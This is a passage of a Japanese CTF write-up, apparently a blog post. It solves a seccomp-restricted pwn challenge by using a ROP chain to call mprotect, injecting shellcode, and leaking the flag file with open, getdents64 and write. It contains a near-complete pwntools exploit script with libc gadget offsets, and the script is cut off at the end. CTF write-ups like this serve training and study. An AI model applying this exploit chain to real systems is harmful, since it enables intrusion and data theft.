version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>解法 1：ファイルデータを出力して Flag を取得する</h2>\n<p>seccomp の回避と Shell Code について整理できたところで、いよいよこの問題の Flag を取得していきます。</p>\n<p>今回の問題バイナリの場合、Flag を取得するために必要なステップは以下の通りです。</p>\n<p>seccomp によって execve と execveat が禁止されているので、Shell の取得ではなくファイルデータのリークを方針としています。</p>\n<ol>\n<li><code class=\"language-text\">/app/ctf4b/flag-$(md5sum /flag.txt | awk '{print $1}').txt</code> に作成されている Flag の正しいファイル名を特定する。</li>\n<li>ファイルから Flag のテキストを取得して標準出力からリークさせる。</li>\n</ol>\n<p>上記の 2 つのステップは、いずれもここまでに確認した Shell Code を組み合わせることで実現できます。</p>\n<p>しかし、すべてのコードを ROP Chain で実行することはかなりの手間になるので、実行コードを Shell Code として埋め込み、mprotect を使用して実行可能権限を付与することでエクスプロイトを行うことにします。</p>\n<h3 id=\"mprotect-でコードに実行権限を付与する\" style=\"position:relative;\"><a href=\"#mprotect-%E3%81%A7%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AB%E5%AE%9F%E8%A1%8C%E6%A8%A9%E9%99%90%E3%82%92%E4%BB%98%E4%B8%8E%E3%81%99%E3%82%8B\" aria-label=\"mprotect でコードに実行権限を付与する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>mprotect でコードに実行権限を付与する</h3>\n<p>この問題では、getdents で Flag の書き込まれたファイル名を特定した後、read/write を使用して標準出力にファイル内のテキストを出力することで Flag を取得できます。</p>\n<p>しかし、このような操作を行う Shell Code と対応する ROP Gadget を見つけて ROP Chain を構築するのは比較的難易度が高いです。</p>\n<p>このような場合、ROP Chain を使用して任意の領域に実行権限を割り当て、その領域に対してペイロードを埋め込むことで ROP Chain ではなく、Shell Code をそのまま実行することができます。</p>\n<p>今回は PIE が無効なので、Shell Code の書き込み先の領域の指定にはバイナリの仮想アドレスをそのまま利用できます。</p>\n<p>.data セクションには seccomp のフィルタが埋め込まれていますが、エクスプロイトの時点では上書きしてしまっても問題ないので、今回は 0x404060 を含む領域をターゲットとします。</p>\n<p>今回の問題バイナリで mprotect を使用して 0x404000 から 0x405000 の範囲に書き込みと実行権限を付与する ROP Chain は以下の通り構築できます。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">system_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"@\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\nlibc_baseaddress <span class=\"token operator\">=</span> system_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x50d70</span>\nbinsh_addr <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x1d8678</span>\nmprotect_addr <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x11eaa0</span>\n\npop_rdx_r12_ret <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x13b649</span>\npop_rdi_ret <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x1bbea1</span>\npop_rsi_r15_ret <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x1bbe9f</span>\nret <span class=\"token operator\">=</span> <span class=\"token number\">0x4012fc</span>\n\npayload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n    <span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> <span class=\"token string\">b\"B\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>\n    pop_rdx_r12_ret<span class=\"token punctuation\">,</span>\n    <span class=\"token number\">7</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">9999</span><span class=\"token punctuation\">,</span>\n    pop_rsi_r15_ret<span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x1000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">9999</span><span class=\"token punctuation\">,</span>\n    pop_rdi_ret<span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x404000</span><span class=\"token punctuation\">,</span>\n    mprotect_addr\n<span class=\"token punctuation\">)</span>\ntarget<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></code></pre></div>\n<p>このペイロードでは、以下の 3 つのレジスタを設定した後に mprotect を実行しています。</p>\n<div class=\"gatsby-highlight\" data-language=\"nasm\"><pre class=\"language-nasm\"><code class=\"language-nasm\">mov <span class=\"token register variable\">rdx</span>, <span class=\"token number\">7</span> <span class=\"token comment\">; R|W|X</span>\nmov <span class=\"token register variable\">rsi</span>, <span class=\"token number\">0x1000</span> <span class=\"token comment\">; 対象とするメモリサイズ</span>\nmov <span class=\"token register variable\">rdi</span>, {target_addr}</code></pre></div>\n<p>この ROP Chain によって、0x404000 から 0x405000 の領域に書き込みと実行権限を割り当てることができます。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 898px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/1ca77a324b9ce192f099940b039ee08f/84cc5/image-20240628210517901.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABQUlEQVQY0z2R2XKCQBBFeVVARQVBSyWoiYZ92BEMIf7/L91cSMWHU7ere3odyVkdYM9XeDvdoC0WUBcbKDMN86WJGf2KPIWqKFDVARUK7Rey/FJ5sIlUfvVo+h5pUaH76eHHCbTlCrZzQZKXiBMBkaYjeVn+aVUiK3IEUTSq6/t8l8APQ0iN66ELQpS3T/QRk88XrDUNzm6H2vOQflxRMJaT+HRGzHj2fh39gXMaYwH9QzykSgmLCc/HoJHrohAJwiBAEgv41xsMTmutdQRMOGy3I1vdwMG0sLcsGGyuTCaYT3kaqtS0Le5Ng5oUXOmb65dVhfbxQBTH0A0D+saA4EppliHLuSInj4UY2R+PmLCYzFsOSF3Xoa5rlCx2r+94Pp/ImdSywaAWpzBNc7SzoSCJeKuUt0zZxLZtTDnZ/0f9AqV1rVJ22N9aAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/1ca77a324b9ce192f099940b039ee08f/8ac56/image-20240628210517901.webp 240w,\n/static/1ca77a324b9ce192f099940b039ee08f/d3be9/image-20240628210517901.webp 480w,\n/static/1ca77a324b9ce192f099940b039ee08f/005c4/image-20240628210517901.webp 898w\"\n              sizes=\"(max-width: 898px) 100vw, 898px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/1ca77a324b9ce192f099940b039ee08f/8ff5a/image-20240628210517901.png 240w,\n/static/1ca77a324b9ce192f099940b039ee08f/e85cb/image-20240628210517901.png 480w,\n/static/1ca77a324b9ce192f099940b039ee08f/84cc5/image-20240628210517901.png 898w\"\n            sizes=\"(max-width: 898px) 100vw, 898px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/1ca77a324b9ce192f099940b039ee08f/84cc5/image-20240628210517901.png\"\n            alt=\"image-20240628210517901\"\n            title=\"image-20240628210517901\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<h3 id=\"任意のアドレスにペイロードを埋め込む\" style=\"position:relative;\"><a href=\"#%E4%BB%BB%E6%84%8F%E3%81%AE%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%AB%E3%83%9A%E3%82%A4%E3%83%AD%E3%83%BC%E3%83%89%E3%82%92%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%80\" aria-label=\"任意のアドレスにペイロードを埋め込む permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>任意のアドレスにペイロードを埋め込む</h3>\n<p>0x404000 から 0x405000 の領域に書き込みと実行権限を割り当てることができたので、次は Stack 領域ではなくこのアドレス空間に Shell Code を埋め込んでいきます。</p>\n<p>手法としてはここまでに実践したものと同じく、read を使用して標準入力から受け取ったバイトデータの保存先を任意のアドレスに向ける方法を使用できます。</p>\n<p>このような操作のため、先ほどの payload に以下の ROP Chain を連結します。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">payload <span class=\"token operator\">+=</span> flat<span class=\"token punctuation\">(</span>\n    xor_rax_ret<span class=\"token punctuation\">,</span>\n    pop_rdx_r12_ret<span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">9999</span><span class=\"token punctuation\">,</span>\n    pop_rsi_r15_ret<span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x404060</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">9999</span><span class=\"token punctuation\">,</span>\n    pop_rdi_ret<span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    syscall_ret\n<span class=\"token punctuation\">)</span>\ntarget<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\ntarget<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>このコードでは、以下の Shell Code と同等の処理を実装しています。</p>\n<div class=\"gatsby-highlight\" data-language=\"nasm\"><pre class=\"language-nasm\"><code class=\"language-nasm\">mov <span class=\"token register variable\">rdi</span>, <span class=\"token number\">0</span> <span class=\"token comment\">; fd を stdin に</span>\nmov <span class=\"token register variable\">rax</span>, <span class=\"token number\">0</span> <span class=\"token comment\">; read</span>\nmov <span class=\"token register variable\">rsi</span>, <span class=\"token number\">0x404060</span> <span class=\"token comment\">; 書き込み先</span>\nmov <span class=\"token register variable\">rdx</span>, <span class=\"token number\">0x100</span> <span class=\"token comment\">; 読み取りバイト数</span>\nsyscall</code></pre></div>\n<p>実際にこのスクリプトを実行してみると、以下のように 0x404060 から始まるデータ領域が A で埋め尽くされることを確認できます。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 853px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/f47d5b7248e9b00dccaa62468a658664/66caf/image-20240628214614945.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 59.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABzklEQVQoz22TW5OTQBCFeUhtGEIwFy4JhDshJASz60ZrSy1L/f//6TindRDXfZjqk2H662usZFUjXec4HGL0fS8nTVNsNhtEUYQwDLHdbkUb6/u+6N1uh9VqhcViAdd1xVoP4Veo4BGz2QxN0yKOY1RVpQMc9O9GDvXxeJRAtHmeiz6dTgiCAPP5XIA8lh18gxfdUSQKbZPpqHu0bTtCpsAsy+RbURQjMEkSOSNwHvzAKn7Bc6/w9L5EnPx+aJx5qHnHzGhZAXXXdWKHYZgCdYa7ZwxHG0+3BmlWCoQZ0JpSp2BmaDTt+XyW/kkPbf8F76Ibrhp4u2ZSXlXmUgYzKcvyn77WdS0QfqfmHYMtl0t4nscefoYXDshihcc+QFOuUeaBzkqDqxq1Bk2d2VMCTV8ZbL/fy+SpLTv8rku+oy0UPly3qIpQQzIN1D3UDm+VzKyp2UOCqdfrtUAtO/oJN7zDXTzoHbzoJhfaqRudDcgMgNYM5XK5yF46jiP9o7VU8AWu3kNlz3HqCEr/rEr63x4S/HoPufhKqb9TVv5HuH4PR9lo9GM6s6S3hmLuzFAYjIvNzMZ/iuN/gqeBC8eW6DLliXP1aijTKfP9FMjzC15xP8HDCRF6AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f47d5b7248e9b00dccaa62468a658664/8ac56/image-20240628214614945.webp 240w,\n/static/f47d5b7248e9b00dccaa62468a658664/d3be9/image-20240628214614945.webp 480w,\n/static/f47d5b7248e9b00dccaa62468a658664/d8b1f/image-20240628214614945.webp 853w\"\n              sizes=\"(max-width: 853px) 100vw, 853px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f47d5b7248e9b00dccaa62468a658664/8ff5a/image-20240628214614945.png 240w,\n/static/f47d5b7248e9b00dccaa62468a658664/e85cb/image-20240628214614945.png 480w,\n/static/f47d5b7248e9b00dccaa62468a658664/66caf/image-20240628214614945.png 853w\"\n            sizes=\"(max-width: 853px) 100vw, 853px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f47d5b7248e9b00dccaa62468a658664/66caf/image-20240628214614945.png\"\n            alt=\"image-20240628214614945\"\n            title=\"image-20240628214614945\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>ちなみに、最後に追加している <code class=\"language-text\">jmp_rsi</code> は RSI レジスタが保持しているバッファのアドレスにそのままジャンプするために使用します。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 824px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/50c263f9773966f72aad20a8bb0d5d9c/c1c45/image-20240628215127968.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB9ElEQVQoz3VT23LaMBDloZ1iS7Jkybr4AsTYCYZA04SMpwN9yPT//+l0ETjJdCYPZ9Yr7R6dvXgm6gBmLMq6R6jXYM6hMjWcKZF6j9JtYAKdewdrK3TFEt7W4MEjcx6CrAolskxCCIGZ8Bb9doeu36FwNRQRlmTLcgHdlAhuBXkhNwoyN/DSQilDfg6mNSEH1wacczDGMCtcgb9vb3h6+kkJAkXQpKRAVZVoqhqeFHAK5GlKCSkSlkR78SewlIER4YV0ZoPD6XTGfn+AdhrLzYoIrpecSuC3wCnhf//zeVQolMSf8xmH/Q6OlO2GASm9miRJxCVoCo7fX2FS6Js7NMsB2vcQ+o5UtshNgPUNLPWSyQYso8EJ6pegXn0Ci7id82s1s/H3K+q7X/imjkjsGWn+gPu+w/g6ou96pPR6wtnV3lRPuFQyqZ/P59eSj+MzFu0zfuiRCE8QZsBqvUR7aFFUFoXIUDMalsrhaANCCO8wxkQSpRSapoGmqZPCI5r2Bd9vhFwPuH9Yo3/saC89NA3GUlKeCSLQKIgk2sIgz1WcuJRZfExKiVm3GeJSZ9mKdmpLS97CLxq07UBBDZWrkIgcKdmUSVqbD6SMCONdTi1IryV32xf0mxHd6hHOH7B2JXzFEUoLT38KYxn1SX4JFpG9T/kfo3wPL1P96RIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/50c263f9773966f72aad20a8bb0d5d9c/8ac56/image-20240628215127968.webp 240w,\n/static/50c263f9773966f72aad20a8bb0d5d9c/d3be9/image-20240628215127968.webp 480w,\n/static/50c263f9773966f72aad20a8bb0d5d9c/5758c/image-20240628215127968.webp 824w\"\n              sizes=\"(max-width: 824px) 100vw, 824px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/50c263f9773966f72aad20a8bb0d5d9c/8ff5a/image-20240628215127968.png 240w,\n/static/50c263f9773966f72aad20a8bb0d5d9c/e85cb/image-20240628215127968.png 480w,\n/static/50c263f9773966f72aad20a8bb0d5d9c/c1c45/image-20240628215127968.png 824w\"\n            sizes=\"(max-width: 824px) 100vw, 824px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/50c263f9773966f72aad20a8bb0d5d9c/c1c45/image-20240628215127968.png\"\n            alt=\"image-20240628215127968\"\n            title=\"image-20240628215127968\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<h3 id=\"埋め込んだ-shell-code-を実行する\" style=\"position:relative;\"><a href=\"#%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%93%E3%81%A0-shell-code-%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B\" aria-label=\"埋め込んだ shell code を実行する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>埋め込んだ Shell Code を実行する</h3>\n<p>ここまでに実践した内容を基に以下の Solver を作成しました。</p>\n<p>これを実行すると Flag を取得することができます。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> re\n\n<span class=\"token comment\"># Set context</span>\ncontext<span class=\"token punctuation\">.</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">\"amd64\"</span>\ncontext<span class=\"token punctuation\">.</span>endian <span class=\"token operator\">=</span> <span class=\"token string\">\"little\"</span>\ncontext<span class=\"token punctuation\">.</span>word_size <span class=\"token operator\">=</span> <span class=\"token number\">64</span>\n\ntarget <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4567</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># Exploit</span>\nr <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Name: \"</span><span class=\"token punctuation\">)</span>\n\nsystem_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"@\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\nlibc_baseaddress <span class=\"token operator\">=</span> system_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x50d70</span>\nbinsh_addr <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x1d8678</span>\nmprotect_addr <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x11eaa0</span>\n\npop_rdx_r12_ret <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x13b649</span>\npop_rdi_ret <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x1bbea1</span>\npop_rsi_r15_ret <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x1bbe9f</span>\nxor_rax_ret <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x1a46c0</span>\nsyscall_ret <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x140e2b</span>\njmp_rsi <span class=\"token operator\">=</span> libc_baseaddress <span class=\"token operator\">+</span> <span class=\"token number\">0x14d1f9</span>\nret <span class=\"token operator\">=</span> <span class=\"token number\">0x4012fc</span>\n\n<span class=\"token comment\"># memprotect ROP chain</span>\npayload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n    <span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> <span class=\"token string\">b\"B\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>\n    ret<span class=\"token punctuation\">,</span>\n    pop_rdx_r12_ret<span class=\"token punctuation\">,</span>\n    <span class=\"token number\">7</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">9999</span><span class=\"token punctuation\">,</span>\n    pop_rsi_r15_ret<span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x1000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">9999</span><span class=\"token punctuation\">,</span>\n    pop_rdi_ret<span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x404000</span><span class=\"token punctuation\">,</span>\n    mprotect_addr\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># read ROP chain</span>\npayload <span class=\"token operator\">+=</span> flat<span class=\"token punctuation\">(</span>\n    xor_rax_ret<span class=\"token punctuation\">,</span>\n    pop_rdx_r12_ret<span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">9999</span><span class=\"token punctuation\">,</span>\n    pop_rsi_r15_ret<span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x404060</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">9999</span><span class=\"token punctuation\">,</span>\n    pop_rdi_ret<span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    syscall_ret<span class=\"token punctuation\">,</span>\n    jmp_rsi\n<span class=\"token punctuation\">)</span>\ntarget<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># execute shell code</span>\nopen_asm <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>linux<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/app/ctf4b/\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\ngetdents64_asm <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>linux<span class=\"token punctuation\">.</span>getdents64<span class=\"token punctuation\">(</span><span class=\"token string\">\"rax\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rsp\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span>\nwrite_asm <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>linux<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rsp\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\"\"\n</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>open_asm<span class=\"token punctuation\">}</span></span><span class=\"token string\">\n</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>getdents64_asm<span class=\"token punctuation\">}</span></span><span class=\"token string\">\n</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>write_asm<span class=\"token punctuation\">}</span></span><span class=\"token string\">\n\"\"\"</span></span><span class=\"token punctuation\">)</span>\n\nread_asm <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>linux<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4040b9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span>\nshellcode <span class=\"token operator\">+=</span> asm<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\"\"\n</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>read_asm<span class=\"token punctuation\">}</span></span><span class=\"token string\">\n\"\"\"</span></span><span class=\"token punctuation\">)</span>\ntarget<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>shellcode <span class=\"token operator\">+</span> <span class=\"token string\">b\"A\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\ntarget<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nr <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npattern <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">rb\"flag-[0-9a-z]{32}.txt\"</span><span class=\"token punctuation\">)</span>\nfile_name <span class=\"token operator\">=</span> pattern<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>decode<span 